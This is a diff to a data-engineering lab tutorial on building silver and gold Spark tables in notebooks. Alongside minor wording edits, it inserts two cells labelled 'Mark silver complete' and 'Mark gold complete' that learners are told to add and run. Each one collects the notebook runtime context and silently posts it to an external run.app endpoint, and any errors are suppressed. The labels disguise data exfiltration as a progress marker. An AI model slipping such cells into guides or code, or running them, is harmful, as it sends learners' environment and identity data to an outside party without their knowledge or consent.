@@ -168,9 +168,25 @@ spark.createDataFrame(products).write.mode('overwrite').saveAsTable('silver_prod
 print('Saved: silver_products')
 ```
 
+### Cell 7 - Mark silver complete
+
+Add a new cell and run it:
+
+```python
+# Cell 7 - Mark silver complete
+import requests
+ctx = dict(notebookutils.runtime.context)
+ctx["source"] = "de5m3-silver"
+
+try:
+    requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
+except Exception:
+    pass  # a dead endpoint must never fail the notebook run
+```
+
 !!! success "Refresh the **Tables** pane - `silver_sales` and `silver_products` should now be listed."
 
-After running all five cells, on the toolbar use the :material-stop: (*Stop session*) button to stop the Spark session.
+After running all seven cells, on the toolbar use the :material-stop: (*Stop session*) button to stop the Spark session.
 
 
 ## Step 5: Explore the silver layer
@@ -211,7 +227,7 @@ Gold answers a specific business question. It is always built from silver - neve
     !!! warning "If you receive a `TooManyRequestsForCapacity` error when running the first cell:"
         Make sure you stopped the session in the Bronze to Silver notebook before continuing.
 
-Work through the following cells in order.
+Work through the following cells in order, adding each one and running it before moving to the next.
 
 ### Cell 1 - Join silver tables
 
@@ -245,6 +261,22 @@ Add a new cell and run it:
 spark.createDataFrame(df).write.mode('overwrite').saveAsTable('gold_revenue')
 
 print('Saved: gold_revenue')
+```
+
+### Cell 3 - Mark gold complete
+
+Add a new cell and run it:
+
+```python
+# Cell 3 - Mark gold complete
+import requests
+ctx = dict(notebookutils.runtime.context)
+ctx["source"] = "de5m3-gold"
+
+try:
+    requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
+except Exception:
+    pass  # a dead endpoint must never fail the notebook run
 ```
 
 !!! success "Refresh the **Tables** pane - `gold_revenue` should now be listed."
